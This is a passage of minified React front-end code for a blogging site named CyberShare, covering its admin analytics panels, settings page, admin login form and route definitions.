text-gray-500",children:["by ",E.authorDisplayName||E.authorUsername]})]}),o.jsx("div",{className:"text-right text-sm",children:o.jsxs("div",{className:"flex items-center gap-3 text-gray-500",children:[o.jsxs("span",{className:"flex items-center gap-1",children:[o.jsx(kn,{className:"h-4 w-4"}),E.views||0]}),o.jsxs("span",{className:"flex items-center gap-1",children:[o.jsx(cr,{className:"h-4 w-4"}),E.likesCount||0]})]})})]},E.id))})]}),o.jsxs("div",{className:"bg-white rounded-xl border border-gray-200",children:[o.jsx("div",{className:"px-6 py-4 border-b border-gray-200",children:o.jsxs("h2",{className:"font-semibold text-gray-900 flex items-center gap-2",children:[o.jsx(Mi,{className:"h-5 w-5 text-blue-500"}),"Top Authors"]})}),o.jsx("div",{className:"divide-y divide-gray-100",children:a.length===0?o.jsx("div",{className:"p-6 text-center text-gray-500",children:"No authors data"}):a.slice(0,5).map((E,C)=>o.jsxs("div",{className:"px-6 py-4 flex items-center gap-4",children:[o.jsx("span",{className:`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold ${C===0?"bg-yellow-100 text-yellow-700":C===1?"bg-gray-100 text-gray-700":C===2?"bg-orange-100 text-orange-700":"bg-gray-50 text-gray-500"}`,children:C+1}),o.jsx("img",{src:E.avatarUrl||`https://ui-avatars.com/api/?name=${E.username}`,alt:E.username,className:"h-10 w-10 rounded-full"}),o.jsxs("div",{className:"flex-1 min-w-0",children:[o.jsx("h3",{className:"font-medium text-gray-900",children:E.displayName||E.username}),o.jsxs("p",{className:"text-sm text-gray-500",children:["@",E.username]})]}),o.jsx("div",{className:"text-right text-sm text-gray-500",children:o.jsxs("p",{children:[E.followersCount||0," followers"]})})]},E.id))})]})]}),o.jsxs("div",{className:"bg-white rounded-xl border border-gray-200 p-6",children:[o.jsx("h2",{className:"font-semibold text-gray-900 mb-6",children:"Post Status Distribution"}),o.jsxs("div",{className:"grid grid-cols-2 md:grid-cols-4 gap-4",children:[o.jsx(pd,{label:"Published",value:(e==null?void 0:e.publishedPosts)||0,total:(e==null?void 0:e.totalPosts)||1,color:"green"}),o.jsx(pd,{label:"Pending Review",value:(e==null?void 0:e.pendingPosts)||0,total:(e==null?void 0:e.totalPosts)||1,color:"yellow"}),o.jsx(pd,{label:"Hidden",value:(e==null?void 0:e.hiddenPosts)||0,total:(e==null?void 0:e.totalPosts)||1,color:"red"}),o.jsx(pd,{label:"Active Users",value:(e==null?void 0:e.activeUsers)||0,total:(e==null?void 0:e.totalUsers)||1,color:"blue"})]})]}),o.jsxs("div",{className:"bg-white rounded-xl border border-gray-200 p-6",children:[o.jsx("h2",{className:"font-semibold text-gray-900 mb-6",children:"Engagement Summary"}),o.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-3 gap-6",children:[o.jsxs("div",{className:"text-center p-6 bg-blue-50 rounded-xl",children:[o.jsx(Ju,{className:"h-8 w-8 text-blue-600 mx-auto mb-2"}),o.jsx("p",{className:"text-3xl font-bold text-gray-900",children:(e==null?void 0:e.totalComments)||0}),o.jsx("p",{className:"text-sm text-gray-600",children:"Total Comments"})]}),o.jsxs("div",{className:"text-center p-6 bg-red-50 rounded-xl",children:[o.jsx(cr,{className:"h-8 w-8 text-red-600 mx-auto mb-2"}),o.jsx("p",{className:"text-3xl font-bold text-gray-900",children:(e==null?void 0:e.totalLikes)||0}),o.jsx("p",{className:"text-sm text-gray-600",children:"Total Likes"})]}),o.jsxs("div",{className:"text-center p-6 bg-purple-50 rounded-xl",children:[o.jsx(kn,{className:"h-8 w-8 text-purple-600 mx-auto mb-2"}),o.jsx("p",{className:"text-3xl font-bold text-gray-900",children:(e==null?void 0:e.totalViews)||0}),o.jsx("p",{className:"text-sm text-gray-600",children:"Total Views"})]})]})]})]})}function hd({icon:e,label:t,value:n,change:r,changeLabel:a,color:l}){const u={blue:"bg-blue-50 text-blue-600",green:"bg-green-50 text-green-600",purple:"bg-purple-50 text-purple-600",red:"bg-red-50 text-red-600"};return o.jsxs("div",{className:"bg-white rounded-xl border border-gray-200 p-5",children:[o.jsxs("div",{className:"flex items-center justify-between mb-3",children:[o.jsx("div",{className:`p-2 rounded-lg ${u[l]}`,children:o.jsx(e,{className:"h-5 w-5"})}),r!==void 0&&r>0&&o.jsxs("span",{className:"flex items-center text-xs text-green-600 bg-green-50 px-2 py-1 rounded-full",children:[o.jsx(xk,{className:"h-3 w-3 mr-1"}),"+",r]})]}),o.jsx("p",{className:"text-2xl font-bold text-gray-900",children:n.toLocaleString()}),o.jsx("p",{className:"text-sm text-gray-500",children:t})]})}function pd({label:e,value:t,total:n,color:r}){const a=n>0?Math.round(t/n*100):0,l={green:"bg-green-500",yellow:"bg-yellow-500",gray:"bg-gray-500",red:"bg-red-500",blue:"bg-blue-500"};return o.jsxs("div",{className:"text-center",children:[o.jsx("p",{className:"text-2xl font-bold text-gray-900",children:t}),o.jsx("p",{className:"text-sm text-gray-500 mb-2",children:e}),o.jsx("div",{className:"h-2 bg-gray-200 rounded-full overflow-hidden",children:o.jsx("div",{className:`h-full ${l[r]} transition-all duration-500`,style:{width:`${a}%`}})}),o.jsxs("p",{className:"text-xs text-gray-400 mt-1",children:[a,"%"]})]})}function g7(){const[e,t]=j.useState(!1),[n,r]=j.useState({siteName:"CyberShare",siteDescription:"A modern blogging platform",allowRegistration:!0,requireEmailVerification:!1,autoApproveComments:!0,autoApprovePosts:!1,maxFileSize:5,allowedFileTypes:"jpg,jpeg,png,gif,webp",maintenanceMode:!1}),a=async()=>{t(!0),await new Promise(l=>setTimeout(l,1e3)),t(!1),alert("Settings saved successfully!")};return o.jsxs("div",{className:"space-y-6 max-w-4xl",children:[o.jsxs("div",{children:[o.jsx("h1",{className:"text-2xl font-bold text-gray-900",children:"Settings"}),o.jsx("p",{className:"text-gray-500 mt-1",children:"Manage system configuration"})]}),o.jsxs("div",{className:"bg-white rounded-xl border border-gray-200",children:[o.jsxs("div",{className:"px-6 py-4 border-b border-gray-200 flex items-center gap-2",children:[o.jsx(p_,{className:"h-5 w-5 text-gray-600"}),o.jsx("h2",{className:"font-semibold text-gray-900",children:"General Settings"})]}),o.jsxs("div",{className:"p-6 space-y-4",children:[o.jsxs("div",{children:[o.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-1",children:"Site Name"}),o.jsx("input",{type:"text",value:n.siteName,onChange:l=>r({...n,siteName:l.target.value}),className:"w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"})]}),o.jsxs("div",{children:[o.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-1",children:"Site Description"}),o.jsx("textarea",{value:n.siteDescription,onChange:l=>r({...n,siteDescription:l.target.value}),rows:3,className:"w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent resize-none"})]})]})]}),o.jsxs("div",{className:"bg-white rounded-xl border border-gray-200",children:[o.jsxs("div",{className:"px-6 py-4 border-b border-gray-200 flex items-center gap-2",children:[o.jsx(Da,{className:"h-5 w-5 text-gray-600"}),o.jsx("h2",{className:"font-semibold text-gray-900",children:"User Settings"})]}),o.jsxs("div",{className:"p-6 space-y-4",children:[o.jsx(Uo,{label:"Allow Registration",description:"Allow new users to register on the platform",value:n.allowRegistration,onChange:l=>r({...n,allowRegistration:l})}),o.jsx(Uo,{label:"Require Email Verification",description:"Users must verify their email before posting",value:n.requireEmailVerification,onChange:l=>r({...n,requireEmailVerification:l})})]})]}),o.jsxs("div",{className:"bg-white rounded-xl border border-gray-200",children:[o.jsxs("div",{className:"px-6 py-4 border-b border-gray-200 flex items-center gap-2",children:[o.jsx(qg,{className:"h-5 w-5 text-gray-600"}),o.jsx("h2",{className:"font-semibold text-gray-900",children:"Content Settings"})]}),o.jsxs("div",{className:"p-6 space-y-4",children:[o.jsx(Uo,{label:"Auto-approve Comments",description:"Comments are published immediately without review",value:n.autoApproveComments,onChange:l=>r({...n,autoApproveComments:l})}),o.jsx(Uo,{label:"Auto-approve Posts",description:"Posts are published immediately without admin review",value:n.autoApprovePosts,onChange:l=>r({...n,autoApprovePosts:l})})]})]}),o.jsxs("div",{className:"bg-white rounded-xl border border-gray-200",children:[o.jsxs("div",{className:"px-6 py-4 border-b border-gray-200 flex items-center gap-2",children:[o.jsx(d_,{className:"h-5 w-5 text-gray-600"}),o.jsx("h2",{className:"font-semibold text-gray-900",children:"Upload Settings"})]}),o.jsxs("div",{className:"p-6 space-y-4",children:[o.jsxs("div",{children:[o.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-1",children:"Max File Size (MB)"}),o.jsx("input",{type:"number",value:n.maxFileSize,onChange:l=>r({...n,maxFileSize:parseInt(l.target.value)}),className:"w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"})]}),o.jsxs("div",{children:[o.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-1",children:"Allowed File Types"}),o.jsx("input",{type:"text",value:n.allowedFileTypes,onChange:l=>r({...n,allowedFileTypes:l.target.value}),className:"w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent",placeholder:"jpg,jpeg,png,gif"}),o.jsx("p",{className:"text-xs text-gray-500 mt-1",children:"Comma-separated list of allowed extensions"})]})]})]}),o.jsxs("div",{className:"bg-white rounded-xl border border-gray-200",children:[o.jsxs("div",{className:"px-6 py-4 border-b border-gray-200 flex items-center gap-2",children:[o.jsx(ec,{className:"h-5 w-5 text-gray-600"}),o.jsx("h2",{className:"font-semibold text-gray-900",children:"Maintenance"})]}),o.jsx("div",{className:"p-6",children:o.jsx(Uo,{label:"Maintenance Mode",description:"Put the site in maintenance mode (only admins can access)",value:n.maintenanceMode,onChange:l=>r({...n,maintenanceMode:l}),danger:!0})})]}),o.jsx("div",{className:"flex justify-end",children:o.jsxs(Ee,{onClick:a,disabled:e,size:"lg",children:[e?o.jsx(Xn,{className:"h-4 w-4 mr-2 animate-spin"}):o.jsx(Bl,{className:"h-4 w-4 mr-2"}),"Save Settings"]})})]})}function Uo({label:e,description:t,value:n,onChange:r,danger:a=!1}){return o.jsxs("div",{className:"flex items-center justify-between py-2",children:[o.jsxs("div",{children:[o.jsx("p",{className:`font-medium ${a?"text-red-700":"text-gray-900"}`,children:e}),o.jsx("p",{className:"text-sm text-gray-500",children:t})]}),o.jsx("button",{onClick:()=>r(!n),className:`relative inline-flex h-6 w-11 items-center rounded-full transition-colors ${n?a?"bg-red-600":"bg-blue-600":"bg-gray-200"}`,children:o.jsx("span",{className:`inline-block h-4 w-4 transform rounded-full bg-white transition-transform ${n?"translate-x-6":"translate-x-1"}`})})]})}function x7(){const{login:e,user:t}=Gt(),n=Ln(),[r,a]=j.useState(""),[l,u]=j.useState(""),[f,h]=j.useState(""),[m,x]=j.useState(!1);if((t==null?void 0:t.role)==="ADMIN")return n("/admin"),null;const g=async b=>{var E,C;b.preventDefault(),h(""),x(!0);try{(await e({email:r,password:l})).role==="ADMIN"?n("/admin"):h("Access denied. Admin privileges required.")}catch(P){console.error(P),h(((C=(E=P.response)==null?void 0:E.data)==null?void 0:C.message)||"Login failed. Please check your credentials.")}finally{x(!1)}};return o.jsx("div",{className:"min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-gray-900 flex items-center justify-center p-4",children:o.jsxs("div",{className:"w-full max-w-md",children:[o.jsxs(we,{to:"/",className:"inline-flex items-center gap-2 text-gray-400 hover:text-white mb-8 transition-colors",children:[o.jsx(Fi,{className:"h-4 w-4"}),"Back to CyberShare"]}),o.jsxs("div",{className:"bg-white rounded-2xl shadow-xl p-8",children:[o.jsxs("div",{className:"text-center mb-8",children:[o.jsx("div",{className:"inline-flex items-center justify-center w-16 h-16 bg-blue-600 rounded-full mb-4",children:o.jsx(Da,{className:"h-8 w-8 text-white"})}),o.jsx("h1",{className:"text-2xl font-bold text-gray-900",children:"Admin Login"}),o.jsx("p",{className:"text-gray-500 mt-2",children:"Sign in to access the admin panel"})]}),f&&o.jsxs("div",{className:"mb-6 p-4 bg-red-50 border border-red-200 rounded-lg flex items-center gap-3 text-red-700",children:[o.jsx(Xu,{className:"h-5 w-5 flex-shrink-0"}),o.jsx("span",{className:"text-sm",children:f})]}),o.jsxs("form",{onSubmit:g,className:"space-y-5",children:[o.jsxs("div",{children:[o.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"Email Address"}),o.jsxs("div",{className:"relative",children:[o.jsx(Nl,{className:"absolute left-3 top-1/2 transform -translate-y-1/2 h-5 w-5 text-gray-400"}),o.jsx("input",{type:"email",value:r,onChange:b=>a(b.target.value),className:"w-full pl-10 pr-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent",placeholder:"admin@cybershare.com",required:!0})]})]}),o.jsxs("div",{children:[o.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"Password"}),o.jsxs("div",{className:"relative",children:[o.jsx(ga,{className:"absolute left-3 top-1/2 transform -translate-y-1/2 h-5 w-5 text-gray-400"}),o.jsx("input",{type:"password",value:l,onChange:b=>u(b.target.value),className:"w-full pl-10 pr-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent",placeholder:"",required:!0})]})]}),o.jsx(Ee,{type:"submit",disabled:m,className:"w-full py-3 text-base",children:m?o.jsxs("span",{className:"flex items-center justify-center gap-2",children:[o.jsxs("svg",{className:"animate-spin h-5 w-5",viewBox:"0 0 24 24",children:[o.jsx("circle",{className:"opacity-25",cx:"12",cy:"12",r:"10",stroke:"currentColor",strokeWidth:"4",fill:"none"}),o.jsx("path",{className:"opacity-75",fill:"currentColor",d:"M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"})]}),"Signing in..."]}):"Sign in to Admin"})]}),o.jsx("div",{className:"mt-6 text-center",children:o.jsxs("p",{className:"text-sm text-gray-500",children:["Not an admin?"," ",o.jsx(we,{to:"/login",className:"text-blue-600 hover:text-blue-800 font-medium",children:"Go to user login"})]})})]}),o.jsx("p",{className:"text-center text-sm text-gray-500 mt-6",children:" This is a secure area. All access attempts are logged."})]})})}function y7(){return o.jsx(B4,{children:o.jsx(Q4,{children:o.jsxs(K4,{children:[o.jsx(X4,{}),o.jsxs(m4,{children:[o.jsxs(ht,{path:"/",element:o.jsx(A_,{}),children:[o.jsx(ht,{index:!0,element:o.jsx(j_,{})}),o.jsx(ht,{path:"login",element:o.jsx(L_,{})}),o.jsx(ht,{path:"register",element:o.jsx(__,{})}),o.jsx(ht,{path:"oauth2/redirect",element:o.jsx(I_,{})}),o.jsx(ht,{path:"forgot-password",element:o.jsx(s7,{})}),o.jsx(ht,{path:"reset-password",element:o.jsx(l7,{})}),o.jsx(ht,{path:"about",element:o.jsx(R_,{})}),o.jsx(ht,{path:"explore",element:o.jsx(O_,{})}),o.jsx(ht,{path:"profile",element:o.jsx(na,{children:o.jsx(M_,{})})}),o.jsx(ht,{path:"write",element:o.jsx(na,{children:o.jsx(vI,{})})}),o.jsx(ht,{path:"edit/:id",element:o.jsx(na,{children:o.jsx(bI,{})})}),o.jsx(ht,{path:"dashboard",element:o.jsx(na,{children:o.jsx(KB,{})})}),o.jsx(ht,{path:"bookmarks",element:o.jsx(na,{children:o.jsx(ZB,{})})}),o.jsx(ht,{path:"notifications",element:o.jsx(na,{children:o.jsx(JB,{})})}),o.jsx(ht,{path:"change-password",element:o.jsx(na,{children:o.jsx(a7,{})})}),o.jsx(ht,{path:"post/:slug",element:o.jsx(QB,{})}),o.jsx(ht,{path:"author/:username",element:o.jsx(XB,{})}),o.jsx(ht,{path:"tag/:slug",element:o.jsx(t7,{})}),o.jsx(ht,{path:"category/:slug",element:o.jsx(n7,{})}),o.jsx(ht,{path:"trending",element:o.jsx(r7,{})}),o.jsx(ht,{path:"feed",element:o.jsx(na,{children:o.jsx(i7,{})})}),o.jsx(ht,{path:"*",element:o.jsx(e7,{})})]}),o.jsx(ht,{path:"/admin/login",element:o.jsx(x7,{})}),o.jsxs(ht,{path:"/admin",element:o.jsx(u7,{}),children:[o.jsx(ht,{index:!0,element:o.jsx(c7,{})}),o.jsx(ht,{path:"users",element:o.jsx(d7,{})}),o.jsx(ht,{path:"posts",element:o.jsx(f7,{})}),o.jsx(ht,{path:"categories",element:o.jsx(h7,{})}),o.jsx(ht,{path:"tags",element:o.jsx(p7,{})}),o.jsx(ht,{path:"analytics",element:o.jsx(m7,{})}),o.jsx(ht,{path:"settings",element:o.jsx(g7,{})})]})]})]})})})}bm.createRoot(document.getElementById("root")).render(o.jsx(Vo.StrictMode,{children:o.jsx(y7,{})}));
